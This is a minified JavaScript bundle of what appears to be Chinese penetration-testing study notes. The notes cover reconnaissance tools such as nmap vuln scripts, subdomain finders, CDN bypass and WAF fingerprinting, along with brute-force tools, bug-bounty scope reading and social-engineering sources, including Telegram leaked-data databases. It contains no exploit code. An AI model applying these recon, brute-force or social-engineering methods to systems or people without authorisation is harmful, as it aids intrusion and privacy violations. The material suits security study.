\u5DE5\u5177=function(){var z={name:"nmap_\u57FA\u672C",content:u.a.createElement(u.a.Fragment,null,"\u4F7F\u7528",u.a.createElement("ol",null,u.a.createElement("li",null)))},N={name:"nmap_\u63A2\u9488",desc:u.a.createElement(u.a.Fragment,null,u.a.createElement("ol",null,u.a.createElement("li",null,"\u9488\u5BF9",u.a.createElement("ol",null,u.a.createElement("li",null,"\u64CD\u4F5C\u7CFB\u7EDF"),u.a.createElement("li",null,"\u7AEF\u53E3"))))),content:u.a.createElement(u.a.Fragment,null,"\u64CD\u4F5C\u7CFB\u7EDF",u.a.createElement("ol",null,u.a.createElement("li",null,"\u4ECB\u7ECD",u.a.createElement("ol",null,u.a.createElement("li",null,"\u5728 scripts \u76EE\u5F55\u91CC\uFF0Cnse\u6587\u4EF6"))),u.a.createElement("li",null," \u4F7F\u7528",u.a.createElement("ol",null,u.a.createElement("li",null,"\u4E00\u3001 --script=vuln \u9ED8\u8BA4nse\u63D2\u4EF6"),u.a.createElement("li",null,"\u4E8C\u3001 vulscan\u3001vulners \u8C03\u7528\u7B2C\u4E09\u65B9\u5E93\u63A2\u9488",u.a.createElement("ol",null,u.a.createElement("li",null,"\u4ECE GitHub \u4E0A\u4E0B\u8F7D\uFF0C\u653E\u5165 scripts \u4E0B\uFF0C\u7528 --script \u6307\u5B9A")))))),"\u7AEF\u53E3",u.a.createElement("ol",null,u.a.createElement("li",null,"\u4ECB\u7ECD"),u.a.createElement("li",null,"\u4F7F\u7528")))};return{\u57FA\u672C:z,\u63A2\u9488:N}}(),c.MsfConsole_\u7EFC\u5408\u5DE5\u5177=function(){var z={name:"MsfConsole_\u5F31\u53E3\u4EE4\u6A21\u5757",content:u.a.createElement(u.a.Fragment,null,"\u4F7F\u7528",u.a.createElement("ol",null,u.a.createElement("li",null)))};return{\u5F31\u53E3\u4EE4\u6A21\u5757:z}}(),c.\u601D\u8DEF\u8D44\u6599=function(){var z={name:"bit4_\u5B50\u57DF\u540D\u601D\u8DEF",content:u.a.createElement(u.a.Fragment,null,"\u601D\u7EF4\u5BFC\u56FE\uFF1A",s("bit4_\u5B50\u57DF\u540D\u601D\u8DEF","https://github.com/bit4woo/domain_hunter/blob/master/doc/xmind.png"))};return{bit4_\u5B50\u57DF\u540D\u601D\u8DEF:z}}(),c.\u7EC4=function(){var z=u.a.createElement(u.a.Fragment,null,"APP\u91CC\uFF0C\u8BBE\u8BA1\u7684\u7F51\u7AD9\uFF0C\u6709\u76F8\u5E94\u7684 \u3010\u68C0\u6D4B\u552F\u4E00\u6027\u3011",u.a.createElement("ol",null,u.a.createElement("li",null,"\u4E0D\u7136\uFF0C\u7ECF\u5E38\u7206\u51FA \u3010400 Bad Request\u3011"),u.a.createElement("li",null,"\u5229\u7528\u3010\u626B\u63CF\u5DE5\u5177\u3011\u65F6\uFF0C\u8BBE\u7F6E\u91CC\u9762\uFF0C\u4FEE\u6539\u626B\u63CF\u7684\u3010header\u5934\u90E8\u3011"))),N={name:"http\u534F\u8BAE_\u6293\u5305\u5DE5\u5177",steps:[c.BurpSuite_\u6293\u5305\u5DE5\u5177,c.Charles_\u6293\u5305\u5DE5\u5177,c.Fiddler_\u6293\u5305\u5DE5\u5177,c.\u6293\u5305\u7CBE\u7075_\u6293\u5305\u5DE5\u5177]},K={name:"\u5176\u4ED6\u534F\u8BAE_\u6293\u5305\u5DE5\u5177",steps:[c.WireShark_\u6293\u5305\u5DE5\u5177]};return{\u8D85\u7EA7Ping:{name:"\u8D85\u7EA7ping",content:u.a.createElement(u.a.Fragment,null,"\u4ECB\u7ECD\uFF1A",u.a.createElement("ol",null,u.a.createElement("li",null,"\u591A\u4E2A\u5730\u533A\u3001\u5730\u70B9\uFF0Cping\u670D\u52A1\u5668\uFF0C\u7684\u7F51\u7EDC\u6D4B\u8BD5"),u.a.createElement("li",null,"\u6839\u636E \u3010\u81EA\u8EABIP\u5730\u5740\u56DE\u663E\u3011 \uFF0C\u6765\u5224\u65AD \u6709CDN\u8FD8\u662F\u6CA1\u6709"),u.a.createElement("li",null,"\u4E00\u4E2A\u7F51\u7AD9\uFF0C\u51FA\u73B0 2\u4E2AIP \uFF0C\u5C31\u8BF4\u660E \u4F60\u4FE9\u770B\u5230\u7684\u4E1C\u897F \u4E0D\u4E00\u6837")),"\u4F7F\u7528\uFF1A",u.a.createElement("ol",null,u.a.createElement("li",null,"\u641C\u7D22 \u8D85\u7EA7ping"),u.a.createElement("li",null,"\u9009\u62E9\u3010\u975E\u6D32\u56FD\u5BB6\u3011\uFF0C\u8FDB\u884C ping"),u.a.createElement("li",null,"\u5E38\u7528\u7684\uFF1A",u.a.createElement("ol",null,c.\u6E32\u67D3_\u76F4\u63A5\u653Eol_\u4E0D\u9700\u8981\u5305li(c.asm_ca_com_\u8D85\u7EA7Ping),c.\u6E32\u67D3_\u76F4\u63A5\u653Eol_\u4E0D\u9700\u8981\u5305li(c.tools_ipip_net_\u8D85\u7EA7Ping),c.\u6E32\u67D3_\u76F4\u63A5\u653Eol_\u4E0D\u9700\u8981\u5305li(c.get_site_ip_\u771F\u5B9EIP_\u7B2C\u4E09\u65B9\u63A5\u53E3),c.\u6E32\u67D3_\u76F4\u63A5\u653Eol_\u4E0D\u9700\u8981\u5305li(c.securitytrails_com_\u7EFC\u5408\u67E5\u8BE2.\u8D85\u7EA7Ping)))))},"\u3010\u7EC4\u3011CDN\u626B\u5168\u7F51":{name:"CDN \u626B\u5168\u7F51",steps:[c.zmap,c.fuckcdn,c.w8fuckcdn,c.get_site_ip_\u771F\u5B9EIP_\u7B2C\u4E09\u65B9\u63A5\u53E3]},"\u3010\u7EC4\u3011\u5B50\u57DF\u540D\u5DE5\u5177":{name:"\u5B50\u57DF\u540D\u5DE5\u5177",desc:u.a.createElement(u.a.Fragment,null,"\u53E6\u5916\u601D\u8DEF\uFF1A",u.a.createElement("ol",null,c.\u6E32\u67D3_\u76F4\u63A5\u653Eol_\u4E0D\u9700\u8981\u5305li(c.\u601D\u8DEF\u8D44\u6599.bit4_\u5B50\u57DF\u540D\u601D\u8DEF))),steps:[c.bugscaner_\u7EFC\u5408\u67E5\u8BE2.\u67E5\u5B50\u57DF\u540D,c.www_dnsgrep_cn_\u5B50\u57DF\u540D,c.\u624B\u52A8\u67E5\u8BE2.\u5B50\u57DF\u540D_\u624B\u52A8\u67E5\u8BE2,c.securitytrails_com_\u7EFC\u5408\u67E5\u8BE2.\u5B50\u57DF\u540D,c.\u601D\u8DEF\u8D44\u6599.bit4_\u5B50\u57DF\u540D\u601D\u8DEF,o.\u57DF\u540D_\u6536\u96C6,c.teemo_\u5168\u81EA\u52A8\u57DF\u540D_\u5B50\u57DF\u540D_\u6536\u96C6\u5DE5\u5177,c.Layer_\u5B50\u57DF\u540D_\u6316\u6398\u673A_\u5DE5\u5177,c.subdomainbrute_\u5B50\u57DF\u540D_\u7206\u7834\u5DE5\u5177,c.\u706F\u5854ARL_\u5168\u81EA\u52A8_\u6240\u6709\u8D44\u4EA7\u6536\u96C6_\u5DE5\u5177]},\u57DF\u540D:{"\u3010\u7EC4\u3011\u67E5\u5907\u6848\u5DE5\u5177_whois_\u7B49\u7B49":{name:"\u67E5\u5907\u6848\u5DE5\u5177_whois_\u7B49\u7B49",steps:[c.\u624B\u52A8\u67E5\u8BE2.\u67E5\u5907\u6848_\u624B\u52A8\u67E5\u8BE2,c.chinaz_\u7EFC\u5408\u67E5\u8BE2.\u67E5\u5907\u6848,c.chinaz_\u7EFC\u5408\u67E5\u8BE2.\u67E5whois,c.west_cn_\u7EFC\u5408\u67E5\u8BE2.\u67E5\u5907\u6848,c.west_cn_\u7EFC\u5408\u67E5\u8BE2.\u67E5whois,c.www_zimiclub_com_\u5907\u6848_\u67E5\u8BE2,{name:"\u4E34\u65F6\u589E\u52A0\u4E00\u4E2A\u3010Whois\u3011\u7684Chrome\u63D2\u4EF6",desc:u.a.createElement(u.a.Fragment,null,u.a.createElement("p",null,"\u63D2\u4EF6\u94FE\u63A5\uFF1Ahttps://chrome.google.com/webstore/detail/ip-whois-flags-chrome-web/kmdfbacgombndnllogoijhnggalgmkon/related"),u.a.createElement("p",null,"\u4FE1\u606F\u6765\u6E90\u5730\u5740\uFF1A\u8D85\u5B9E\u7528\u7684 chrome \u6269\u5C55\u63A8\u8350 - \u4F59\u817E\u9756\u7684\u6587\u7AE0 - \u77E5\u4E4E https://zhuanlan.zhihu.com/p/61605124"))}]},"\u3010\u7EC4\u3011DNS\u89E3\u6790_\u53CA\u5386\u53F2\u8BB0\u5F55":{name:"DNS\u89E3\u6790_\u53CA\u5386\u53F2\u8BB0\u5F55",steps:[c.x_threatbook_cn_\u7EFC\u5408\u67E5\u8BE2.DNS\u89E3\u6790\u8BB0\u5F55,c.securitytrails_com_\u7EFC\u5408\u67E5\u8BE2.DNS\u89E3\u6790,c.dnsdb_io_DNS\u89E3\u6790\u8BB0\u5F55,c.namelimit_com_DNS\u89E3\u6790\u8BB0\u5F55]}},"\u3010\u7EC4\u3011\u65C1\u6CE8_\u53CD\u67E5IP_\u5DE5\u5177":{name:"\u65C1\u6CE8_\u53CD\u67E5IP_\u5DE5\u5177",steps:[c.\u624B\u52A8\u67E5\u8BE2.\u65C1\u6CE8_\u53CD\u67E5IP_\u624B\u52A8\u67E5\u8BE2,c.securitytrails_com_\u7EFC\u5408\u67E5\u8BE2.\u65C1\u6CE8_\u53CD\u67E5IP,c.api_hackertarget_com_\u65C1\u6CE8_\u53CD\u67E5IP_\u76F4\u63A5\u63A5\u53E3,c.www_robtex_com_\u65C1\u6CE8_\u53CD\u67E5IP,c.x_threatbook_cn_\u7EFC\u5408\u67E5\u8BE2.\u65C1\u6CE8_\u53CD\u67E5IP]},"\u3010\u7EC4\u3011\u7B2C\u4E09\u65B9\u63A5\u53E3":{name:"\u7B2C\u4E09\u65B9\u63A5\u53E3",steps:[c.dnsdb_io_DNS\u89E3\u6790\u8BB0\u5F55,c.tools_ipip_net_\u8D85\u7EA7Ping,c.crt_sh_\u8BC1\u4E66\u67E5\u8BE2,c.securitytrails_com_\u7EFC\u5408\u67E5\u8BE2.DNS\u89E3\u6790,c.opengps_cn_IP\u5B9A\u4F4D,c.ipinfo_io_IP\u5B9A\u4F4D,c.chaipip_com_IP\u5B9A\u4F4D,c.met_red_IP\u5B9A\u4F4D,c.riskIQ_IP\u5927\u6570\u636E\u753B\u50CF]},"\u3010\u7EC4\u3011\u64CD\u4F5C\u7CFB\u7EDF_\u3010\u6F0F\u6D1E\u3011_\u63A2\u9488\u5DE5\u5177":{name:"\u64CD\u4F5C\u7CFB\u7EDF_\u3010\u6F0F\u6D1E\u3011_\u63A2\u9488\u5DE5\u5177",desc:u.a.createElement(u.a.Fragment,null,"\u3010\u6F0F\u6D1E\u63A2\u9488\u3011\u4E00\u822C\u5206\u4E3A\uFF1A\u5DE5\u5177\u3001\u8F6F\u4EF6\u3001\u4EBA\u5DE5\u3002",u.a.createElement("br",null),u.a.createElement("br",null),"\u7CFB\u7EDF\u6F0F\u6D1E\uFF0C\u4E00\u822C\u7528\u5DE5\u5177"),steps:[c.Goby_\u64CD\u4F5C\u7CFB\u7EDF_\u6F0F\u6D1E\u626B\u63CF,c.nmap_\u7EFC\u5408\u5DE5\u5177.\u63A2\u9488,c.Nessus_\u64CD\u4F5C\u7CFB\u7EDF__\u6F0F\u6D1E\u626B\u63CF,c.OpenVas_\u64CD\u4F5C\u7CFB\u7EDF__\u6F0F\u6D1E\u626B\u63CF,c.Nexpose_\u64CD\u4F5C\u7CFB\u7EDF__\u6F0F\u6D1E\u626B\u63CF]},"\u3010\u7EC4\u3011WEB\u5E94\u7528_\u3010\u6F0F\u6D1E\u3011_\u63A2\u9488\u5DE5\u5177":{name:"WEB\u5E94\u7528_\u3010\u6F0F\u6D1E\u3011_\u63A2\u9488\u5DE5\u5177",desc:u.a.createElement(u.a.Fragment,null,"\u2026\u2026\u2026\u2026\u2026\u2026\u2026\u2026"),steps:[c.xray_WEB\u5E94\u7528_\u6F0F\u6D1E\u626B\u63CF,c.awvs_WEB\u5E94\u7528_\u6F0F\u6D1E\u626B\u63CF,c.appscan_WEB\u5E94\u7528_\u6F0F\u6D1E\u626B\u63CF,{name:"\u4F01\u4E1A\u516C\u53F8\u5185\u90E8\u4EA7\u54C1",tags:[F.\u4F01\u4E1A\u516C\u53F8\u5185\u90E8],desc:u.a.createElement(u.a.Fragment,null,"\u6682\u65F6\u4E0D\u9700\u8981\u5173\u6CE8")}]},"\u3010\u7EC4\u3011CMS\u63A2\u9488\u5DE5\u5177_\u6846\u67B6":{name:"CMS\u63A2\u9488\u5DE5\u5177_\u6846\u67B6",desc:u.a.createElement(u.a.Fragment,null,u.a.createElement("ol",null,u.a.createElement("li",null,"\u5F53\u6709\u3010\u7279\u5B9A\u5DE5\u5177\u3011\u65F6\uFF0C\u4F18\u5148\u4F7F\u7528\uFF0C\u66F4\u7B80\u4FBF\u66F4\u5FEB\u6377"),u.a.createElement("li",null,u.a.createElement("br",null)),u.a.createElement("li",null,"\u6B64\u65F6\uFF0C\u6BD4\u4F7F\u7528\u3010\u5E38\u7528\u5DE5\u5177\u3011\uFF0C\u6548\u7387\u8981\u9AD8\u5F97\u591A \uFF08\u3010\u5E38\u7528\u5DE5\u5177\u3011\uFF0C(\u65E9\u8BE5) \u626B\u51FA\u6765\u7684\uFF0C\u5DF2\u7ECF\u7206\u51FA\u6765\u4E86\uFF09"))),steps:[c.cmsscan_CMS\u63A2\u9488,c.wpscan_CMS\u63A2\u9488,c.joomscan_CMS\u63A2\u9488,c.drupalscan_CMS\u63A2\u9488,c.yunsee\u4E91\u6089_CMS\u63A2\u9488,c.WhatWeb_CMS\u63A2\u9488,c.Wrappalyzer_CMS\u63A2\u9488,c.bugscaner_\u7EFC\u5408\u67E5\u8BE2.\u67E5CMS]},"\u3010\u7EC4\u3011\u624B\u673A\u6A21\u62DF\u5668":{name:"\u624B\u673A\u6A21\u62DF\u5668",steps:[{name:"\u900D\u9065"},{name:"\u96F7\u7535"},{name:"\u591C\u795E"},{name:"\u6728\u6728"}]},"\u3010\u7EC4\u3011http\u534F\u8BAE_\u6293\u5305\u5DE5\u5177":N,"\u3010\u7EC4\u3011\u5176\u4ED6\u534F\u8BAE_\u6293\u5305\u5DE5\u5177":K,"\u3010\u7EC4\u3011\u603B\u548C_\u6293\u5305\u5DE5\u5177":{name:"\u603B\u548C_\u6293\u5305\u5DE5\u5177",desc:z,steps:[N,K]},"\u3010\u7EC4\u3011\u7AEF\u53E3_\u3010\u6F0F\u6D1E\u3011_\u63A2\u9488\u5DE5\u5177":{name:"\u7AEF\u53E3_\u3010\u6F0F\u6D1E\u3011_\u63A2\u9488\u5DE5\u5177",steps:[c.nmap_\u7EFC\u5408\u5DE5\u5177.\u63A2\u9488,c.Nessus_\u64CD\u4F5C\u7CFB\u7EDF__\u6F0F\u6D1E\u626B\u63CF,c.masscan_\u7AEF\u53E3\u626B\u63CF]},"\u3010\u7EC4\u3011\u5F31\u53E3\u4EE4\u68C0\u67E5_\u7206\u7834\u5DE5\u5177":{name:"\u5F31\u53E3\u4EE4\u68C0\u67E5_\u7206\u7834\u5DE5\u5177",steps:[c.SnetCracker_\u5F31\u53E3\u4EE4\u68C0\u67E5_\u7206\u7834\u5DE5\u5177,c.MsfConsole_\u7EFC\u5408\u5DE5\u5177.\u5F31\u53E3\u4EE4\u6A21\u5757]}}}();var b=function z(){Object(h.a)(this,z)};b.\u770B\u56FE\u8BC6WAF_\u6536\u96C6\u5E38\u89C1WAF\u62E6\u622A\u9875\u9762=u.a.createElement("div",null,u.a.createElement("div",null,"\u901A\u8FC7\u4E00\u5F20\u3010\u7279\u5F81\u56FE\u7247\u3011\uFF0C\u6765\u8BC6\u522B\u3010WAF\u3011\u3002",u.a.createElement("ol",null,u.a.createElement("li",null,s("\u770B\u56FE\u8BC6WAF-\u6536\u96C6\u5E38\u89C1WAF\u62E6\u622A\u9875\u9762_K3vin`s Blogs-CSDN\u535A\u5BA2_\u5E38\u89C1waf\u9875\u9762","https://blog.csdn.net/weixin_46676743/article/details/112245605")),u.a.createElement("li",null,"\u65B0\u589E\u6761\u76EE\uFF08\u6570\u91CF\u8F83\u591A\uFF09\uFF1A",s("Waf\u8BC6\u522B\u5DE5\u5177\u548C83\u4E2AWaf\u62E6\u622A\u9875\u9762 - \u817E\u8BAF\u4E91\u5F00\u53D1\u8005\u793E\u533A-\u817E\u8BAF\u4E91","https://cloud.tencent.com/developer/article/1872310")))),u.a.createElement("p",null,`
    \u624B\u6D4B\u8FC7\u7A0B\uFF1A
            1.\u9996\u5148\u7528\u3010google\u3011\u53BB\u641C\u4E00\u4E9B  css\u7C7B\u540D\u3001\u5185\u5BB9\u3001title\u6807\u9898 \uFF0C\u4F46\u662F\u6CA1\u7ED3\u679C\u3002
            2.\u7136\u540E\uFF0C\u7528\u3010fofa\u3011\u53BB\u641C\u3002
                    \u53D1\u73B0\u7ED3\u679C\u5F88\u591A\u3002
                    \u7279\u522B\u662F\uFF0C\u53EF\u4EE5\u7528\u3010css\u7C7B\u540D\u3011\u3001\u3010title\u6807\u9898\u3011\uFF0C\u627E\u5230fid\u3002
                            \u3010fid\u3011\u4E0B\uFF0C\u4E00\u4E0B\u5C31\u662F\u4E00\u5927\u7247\u3002
                                    \u6BD4\u5982\u3010fid="HMZM0pv/nABPizwf6SXNDA=="\u3011\u3002
                    \u5F97\u5230\u7684\u4E00\u4E9B\u7279\u5F81\uFF1A
                              1.\u6839\u636E\u56FE\u7247\uFF0C\u7591\u4F3C\u548C\u3010aws\u3011\u7684\u5E03\u5C40\u6709\u70B9\u50CF

                              2.\u6839\u636Efofa\u7ED3\u679C\uFF0C\u6709\u4E2A\u6574\u4F53\u5E03\u5C40\u51E0\u4E4E\u4E00\u81F4\u7684\uFF1A
                                      403 Forbidden
                                              https://im6.ccbft.com/
                                      403 Forbidden by cR
                                              https://doc-w.u.ccb.com/
                                      \u8BF7\u60A8\u767B\u5F55\u7F51\u7AD9\u7BA1\u5BB6
                                              https://139.199.91.35/

                                      \u4ECE\u4E0A\u5206\u6790\uFF0C\u6211\u4E2A\u4EBA\u5F97\u51FA\u7684\u7ED3\u8BBA\uFF0C\u5E94\u8BE5\u662F\u3010\u817E\u8BAF\u4E91\u3011\u7684\u3010waf\u3011\u3002
    `)),b.WAF\u9632\u62A4\u5206\u6790={name:"WAF\u9632\u62A4\u5206\u6790",desc:u.a.createElement(u.a.Fragment,null,m("\u9632\u6B62\u88AB\u5899"),u.a.createElement("br",null),u.a.createElement("br",null),"\u4EC0\u4E48\u662FWAF\u5E94\u7528",u.a.createElement("ol",null,u.a.createElement("li",null)),"\u8BC6\u522BWAF \u5BF9\u4E8E \u5B89\u5168\u6D4B\u8BD5 \u7684\u610F\u4E49",u.a.createElement("ol",null,u.a.createElement("li",null,"\u6709WAF\u7684\u8BDD\uFF0C\u4E0D\u8981\u76F4\u63A5\u7528 \u626B\u63CF\u5668 \u5F00\u626B"))),steps:[{name:"\u901A\u8FC7\u4E00\u5F20\u56FE\uFF0C\u6765\u8BC6\u522BWAF",content:u.a.createElement(u.a.Fragment,null,b.\u770B\u56FE\u8BC6WAF_\u6536\u96C6\u5E38\u89C1WAF\u62E6\u622A\u9875\u9762)},{name:"\u5982\u4F55\u5FEB\u901F\u8BC6\u522BWAF",steps:[c.WafW00f_\u8BC6\u522BWAF,{name:"Shodan\u641C\u7D22 WAF",content:u.a.createElement(u.a.Fragment,null,"\u4ECB\u7ECD",u.a.createElement("ol",null,u.a.createElement("li",null,"\u6709\u5F88\u591A \u5173\u4E8EWAF \u7684\u7F51\u7AD9"),u.a.createElement("li",null,"Waf \u4F1A\u6709\u4E00\u4E2A X-Powered-By:WAF\u3002 \u4E0D\u662F\u901A\u7528\u7684\uFF0C\u53EA\u662F\u90E8\u5206 \u6709\u8FD9\u6837\u4E00\u4E2A\u8868\u73B0")),"\u4F7F\u7528")}]}]};var e=function z(){Object(h.a)(this,z)};e.\u5E94\u7528\u9762=function(){var z={name:"\u7528\u6237\u7BA1\u7406",content:u.a.createElement(u.a.Fragment,null,"\u2026\u2026\u2026\u2026\u2026\u2026\u2026\u2026\uFF1F\uFF1F\uFF1F\uFF1F\uFF1F\uFF1F")},N={name:"\u5BA2\u6237_\u4F1A\u5458_\u7BA1\u7406",content:u.a.createElement(u.a.Fragment,null,"\u2026\u2026\u2026\u2026\u2026\u2026\u2026\u2026\uFF1F\uFF1F\uFF1F\uFF1F\uFF1F\uFF1F")},K={name:"\u6298\u6263\u7BA1\u7406",content:u.a.createElement(u.a.Fragment,null,"\u2026\u2026\u2026\u2026\u2026\u2026\u2026\u2026\uFF1F\uFF1F\uFF1F\uFF1F\uFF1F\uFF1F")},S={name:"\u8425\u9500\u7BA1\u7406",content:u.a.createElement(u.a.Fragment,null,"\u2026\u2026\u2026\u2026\u2026\u2026\u2026\u2026\uFF1F\uFF1F\uFF1F\uFF1F\uFF1F\uFF1F")},T={name:"\u8BA2\u5355\u7BA1\u7406",content:u.a.createElement(u.a.Fragment,null,"\u2026\u2026\u2026\u2026\u2026\u2026\u2026\u2026\uFF1F\uFF1F\uFF1F\uFF1F\uFF1F\uFF1F")},H={name:"\u4EA7\u54C1\u7BA1\u7406",content:u.a.createElement(u.a.Fragment,null,"\u2026\u2026\u2026\u2026\u2026\u2026\u2026\u2026\uFF1F\uFF1F\uFF1F\uFF1F\uFF1F\uFF1F")},q={name:"\u77ED\u4FE1\u7BA1\u7406",content:u.a.createElement(u.a.Fragment,null,"\u2026\u2026\u2026\u2026\u2026\u2026\u2026\u2026\uFF1F\uFF1F\uFF1F\uFF1F\uFF1F\uFF1F")},G={name:"\u652F\u4ED8\u7BA1\u7406",content:u.a.createElement(u.a.Fragment,null,"\u2026\u2026\u2026\u2026\u2026\u2026\u2026\u2026\uFF1F\uFF1F\uFF1F\uFF1F\uFF1F\uFF1F")},ju={name:"\u5E94\u7528\u9762",steps:[z,N,K,S,T,H,q,G]};return{\u7528\u6237\u7BA1\u7406:z,\u5BA2\u6237_\u4F1A\u5458_\u7BA1\u7406:N,\u6298\u6263\u7BA1\u7406:K,\u8425\u9500\u7BA1\u7406:S,\u8BA2\u5355\u7BA1\u7406:T,\u4EA7\u54C1\u7BA1\u7406:H,\u77ED\u4FE1\u7BA1\u7406:q,\u652F\u4ED8\u7BA1\u7406:G,\u603B\u548C:ju}}();var v=function z(){Object(h.a)(this,z)};v.\u4FEE\u590D={\u6253\u597D\u8865\u4E01:u.a.createElement(u.a.Fragment,null,"\u6253\u597D\u8865\u4E01"),\u5173\u95ED\u5165\u53E3:u.a.createElement(u.a.Fragment,null,"\u5173\u95ED\u5165\u53E3"),\u7248\u672C\u5347\u7EA7:u.a.createElement(u.a.Fragment,null,"\u7248\u672C\u5347\u7EA7"),"\u90E8\u7F72WAF / \u9632\u62A4\u5E94\u7528":u.a.createElement(u.a.Fragment,null,"\u90E8\u7F72WAF / \u9632\u62A4\u5E94\u7528",u.a.createElement("ol",null,u.a.createElement("li",null,"hvv\uFF0C\u84DD\u961F\uFF0C\u4E00\u4E9B\u5E94\u7528")))};var D=function z(){Object(h.a)(this,z)};D.\u4E2D\u95F4\u4EF6_\u5E38\u7528\u6F0F\u6D1E={name:"\u4E2D\u95F4\u4EF6_\u5E38\u7528\u6F0F\u6D1E",tags:[F.\u9700\u8981\u91CD\u65B0\u4ECE\u89C6\u9891\u8865\u5145],content:u.a.createElement(u.a.Fragment,null,"\u5728 \u5C0F\u8FEA \u7684\u624B\u4E0A\uFF0C\u6709\u8FD9\u6837\u4E00\u5F20 PDF \u3002")},D.\u7AEF\u53E3\u670D\u52A1_\u5E38\u7528\u6F0F\u6D1E={name:"\u7AEF\u53E3\u670D\u52A1_\u5E38\u7528\u6F0F\u6D1E",tags:[F.\u9700\u8981\u91CD\u65B0\u4ECE\u89C6\u9891\u8865\u5145],desc:u.a.createElement(u.a.Fragment,null,u.a.createElement("ol",null,u.a.createElement("li",null,"\u548C\u3010\u4E2D\u95F4\u4EF6_\u5E38\u7528\u6F0F\u6D1E\u3011\u57FA\u672C\u76F8\u4F3C\uFF0C\u5728\u3010\u6F0F\u6D1E\u53D1\u73B0-API\u63A5\u53E3\u670D\u52A1\u3011\u4E00\u8BFE"),u.a.createElement("li",null,"\u5168\u90E8\u90FD\u5E26\u6709\u3010\u81EA\u8EAB\u7AEF\u53E3\u3011"),u.a.createElement("li",null,"\u800C\u4E14\uFF0C\u6211\u4E4B\u524D\uFF0C\u4E5F\u505A\u8FC7\u4E00\u4E2A\u548C\u8FD9\uFF0C\u5F02\u66F2\u540C\u5DE5\u7684\uFF01\uFF01\uFF01\u3010PortInfo\u3011\u5DE5\u5177\uFF01\uFF01\uFF01")),"\u6216\u8005\uFF0C\u505A\u4E2A\uFF08\u8D85\u94FE\u63A5\uFF09\u53BB\u7FFB\u67E5\uFF0C\u4E5F\u662F\u53EF\u4EE5\u7684\u53E6\u4E00\u79CD\u65B9\u5F0F",u.a.createElement("br",null),"\u6216\u8005\uFF0C\u4E24\u79CD\u65B9\u5F0F\u4E00\u8D77\uFF0C\u90FD\u8FDB\u884C\u4FDD\u7559\uFF08\u7A0B\u5E8F\u7684\u65B9\u5F0F\uFF0C\u66F4\u52A0\u7075\u6D3B\u51C6\u786E\u3001\u53EF\u7F16\u7A0B\uFF09"),steps:[{name:"WEB\u670D\u52A1\u7C7B",steps:[{name:"Tomcat"},{name:"JBoss/WildFly"},{name:"WebLogic"},{name:"WebSphere"},{name:"GlassFish"},{name:"Jetty"},{name:"Apache"},{name:"IIS"},{name:"Resin"},{name:"Nginx"}]},{name:"\u6570\u636E\u5E93\u7C7B",steps:[{name:"MySql"},{name:"MsSql"},{name:"Oracle"},{name:"Redis"},{name:"PostgreSql"},{name:"Sybase"},{name:"MemCache"},{name:"ElasticSearch"},{name:"DB2"}]},{name:"\u5927\u6570\u636E\u7C7B",steps:[{name:"Hadoop"},{name:"ZooKeeper"}]},{name:"\u6587\u4EF6\u5171\u4EAB",steps:[{name:"FTP"},{name:"NFS"},{name:"Samba"},{name:"LDAP"}]},{name:"\u8FDC\u7A0B\u8BBF\u95EE",steps:[{name:"SSH"},{name:"RDP"},{name:"Telnet"},{name:"VNC"},{name:"pcAnyWhere"}]},{name:"\u90AE\u4EF6\u670D\u52A1",steps:[{name:"SMTP"},{name:"POP3"},{name:"IMAP"}]},{name:"\u5176\u4ED6\u670D\u52A1",steps:[{name:"DNS"},{name:"DHCP"},{name:"SNMP"},{name:"RLogin"},{name:"Rsync"},{name:"Zabbix"},{name:"RMI"},{name:"Docker"}]}]};var d=function z(){Object(h.a)(this,z)};d.\u8303\u56F4\u9605\u8BFB_\u5B50\u57DF\u540D\u76F8\u5173={name:"\u8303\u56F4\u9605\u8BFB_\u5B50\u57DF\u540D\u76F8\u5173",tags:[F.\u8303\u56F4\u9605\u8BFB],content:u.a.createElement(u.a.Fragment,null,u.a.createElement("ol",null,u.a.createElement("li",null,"\u5141\u8BB8\uFF1A",u.a.createElement("ol",null,u.a.createElement("li",null,"\u60C5\u51B5\u4E00\uFF1A\u660E\u786E\u5199\u4E86\u3010*\u3011\uFF0C\u5B50\u57DF\u540D\u90FD\u53EF\u4EE5"),u.a.createElement("li",null,"\u60C5\u51B5\u4E8C\uFF1A\u7ED9\u4E86\u4E24\u4E2A\u57DF\u540D\uFF0C\u6CA1\u5199\u4E0D\u5141\u8BB8\u5B50\u57DF\u540D\uFF1B \u90A3\u9ED8\u8BA4\u3010\u5B50\u57DF\u540D\u3011\u90FD\u53EF\u4EE5"))),u.a.createElement("li",null,"\u4E0D\u5141\u8BB8\uFF1A",u.a.createElement("ol",null,u.a.createElement("li",null,"\u660E\u786E\u5199\u4E86\u3010\u5B50\u57DF\u540D\u4E0D\u53EF\u4EE5\u3011\uFF0C\u90A3\u4E48\u5C31\u4E0D\u53EF\u4EE5")))))},d.\u8303\u56F4\u9605\u8BFB_\u793E\u5DE5\u76F8\u5173={name:"\u8303\u56F4\u9605\u8BFB_\u793E\u5DE5\u76F8\u5173",tags:[F.\u8303\u56F4\u9605\u8BFB],content:u.a.createElement(u.a.Fragment,null,u.a.createElement("ol",null,u.a.createElement("li",null,"\u6CA1\u5199\u3010\u4E0D\u5141\u8BB8\u793E\u5DE5\u3011\uFF1B \u90A3\u9ED8\u8BA4\u3010\u793E\u5DE5\u3011\u90FD\u53EF\u4EE5")))};var A=function z(){Object(h.a)(this,z)};A.\u57FA\u672C\u4ECB\u7ECD={name:"\u793E\u5DE5",steps:[d.\u8303\u56F4\u9605\u8BFB_\u793E\u5DE5\u76F8\u5173,{name:"\u5FAE\u4FE1\u516C\u4F17\u53F7"},{name:"QQ\u7FA4",desc:u.a.createElement(u.a.Fragment,null,"\u6BD4\u5982\uFF0C\u641C\u7D22 \u3010\u5951\u7EA6\u9501\u3011")},{name:"\u52A0QQ\u53F7",content:u.a.createElement(u.a.Fragment,null,"\u2026\u2026\u2026\u2026\u2026\u2026\u2026\u2026")},{name:"TG Telegram",content:u.a.createElement(u.a.Fragment,null,u.a.createElement("ol",null,u.a.createElement("li",null,"\u4E0A\u9762\u6709\u793E\u5DE5\u5E93")))}]};var E=function 